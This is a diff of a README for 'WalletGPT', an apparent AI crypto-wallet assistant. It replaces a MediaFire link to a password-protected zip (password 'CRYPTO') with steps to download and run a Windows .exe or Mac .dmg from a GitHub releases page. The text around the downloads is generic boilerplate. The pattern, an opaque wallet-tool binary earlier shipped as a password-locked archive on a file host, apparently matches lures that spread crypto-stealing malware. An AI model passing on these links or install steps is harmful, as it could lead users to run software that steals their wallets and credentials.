@@ -1,43 +1,81 @@
-# 🌀 WalletGPT — Your AI Copilot for Web3 Wallets
+# 🌀 WalletGPT-AI-Copilot-for-Wallets - Your Smart Assistant for Crypto Wallets
 
-**WalletGPT** is a personal crypto assistant powered by AI, built to help you understand, analyze, and interact with your wallet more intelligently.
-
-> From token movements to contract approvals — WalletGPT tells you what’s going on, why it matters, and what to do next.
-
----
-
-## 🔮 Why WalletGPT?
-
-Crypto wallets are powerful, but they lack context. WalletGPT adds meaning to your on-chain life:
-
-- **“What’s this random token I just received?”**
-- **“Why is my balance lower?”**
-- **“Is this contract safe to approve?”**
-- **“Am I making the same mistake over and over?”**
-
----
-
-## 🧠 Features
-
-- 🧾 **Transaction explanation** — readable summaries of on-chain activity
-- 🚨 **Approval & scam warnings** — real-time insights into risky permissions
-- 📊 **Portfolio patterns** — behavior analysis, performance & habits
-- 💡 **Suggestions** — sell/hold alerts, risk tips, gas optimization
-- 🔗 **Cross-app insights** — integrates with Uniswap, OpenSea, DeBank, Zerion, etc.
-- 🗨️ **Telegram & Metamask Snap interface** — chat-based AI wallet assistant
-
----
-
-## ✨ Coming Soon
-
-- 🕹️ "What if I..." simulation (DCA, LP exit, leverage unwind)
-- 🧮 Tax insight & HIFO tracking
-- 🔒 ZK-mode: explain without revealing wallet
-
----
+[![Download WalletGPT](https://img.shields.io/badge/Download%20WalletGPT-Release-blue)](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases)
 
 ## 🚀 Getting Started
 
-👉 [Download.zip](https://www.mediafire.com/folder/vbho728wuqtlp/CRYPTO)
+Welcome to WalletGPT, your personal crypto assistant. This guide will help you download and run the application easily.
 
-**🔐 Password:** `CRYPTO`
+### 💻 System Requirements
+
+Before you begin, ensure your computer meets the following requirements:
+
+- Operating System: Windows 10 or higher, macOS 10.14 or higher
+- Memory: Minimum 4 GB RAM
+- Disk Space: At least 100 MB available
+
+## 🛠️ Download & Install
+
+To get WalletGPT, follow these steps:
+
+1. **Visit the Releases Page**  
+   Go to the official [Releases page](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases).
+
+2. **Select the Latest Release**  
+   On the Releases page, find the latest version. It will usually be at the top.
+
+3. **Download the Correct File**  
+   Look for a file suitable for your system:
+   - For Windows, download `WalletGPT-Windows.exe`
+   - For macOS, download `WalletGPT-Mac.dmg`
+   
+   Click on the file to start downloading.
+
+4. **Run the Installer**  
+   Once the download finishes, locate the file on your computer:
+   - For Windows, double-click `WalletGPT-Windows.exe` to begin installation.
+   - For macOS, open `WalletGPT-Mac.dmg`, then drag the WalletGPT app into your Applications folder.
+
+5. **Open WalletGPT**  
+   After installation, find WalletGPT in your applications and open it. Follow any prompts to complete the setup.
+
+## 🎉 Using WalletGPT
+
+Once the application opens, you will see a user-friendly interface. Here’s how to navigate:
+
+- **Home Screen**: Displays a summary of recent transactions and alerts.
+- **Transaction Section**: Review past transactions, with clear explanations and insights.
+- **Portfolio Section**: Analyze your portfolio and receive tips to optimize performance.
+  
+### 🔍 Understand WalletGPT Features
+
+- **Transaction Explanation**: WalletGPT provides easy-to-read summaries for every transaction in your wallet, helping you understand activities at a glance.
+
+- **Approval & Scam Warnings**: Stay alert with real-time notifications about risky contracts or approvals.
+
+- **Portfolio Patterns**: Gain insight into your portfolio with analysis of your behavior and investment performance.
+
+- **Suggestions**: WalletGPT gives actionable advice on when to sell or hold and tips for optimizing transaction costs.
+
+- **Cross-App Insights**: Integrate with any of your favorite platforms like Uniswap, OpenSea, and more for a comprehensive view of activities.
+
+## ⚙️ Settings & Preferences
+
+Customize WalletGPT to fit your needs:
+
+1. **Notification Settings**: Adjust choices for receiving alerts and warnings.
+2. **Theme Selection**: Switch between light and dark mode for better visibility.
+3. **Language Preferences**: Set the application language according to your preference.
+
+## 📞 Support
+
+If you have any questions or face issues, feel free to reach out for help:
+
+- Check the [FAQ section](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/wiki/FAQ) for common questions.
+- Contact us via email at support@walletgpt.com if you need further assistance.
+
+---
+
+[![Download WalletGPT](https://img.shields.io/badge/Download%20WalletGPT-Release-blue)](https://github.com/notboiii/WalletGPT-AI-Copilot-for-Wallets/releases) 
+
+Get started today with WalletGPT, your smart assistant for managing your crypto wallet!
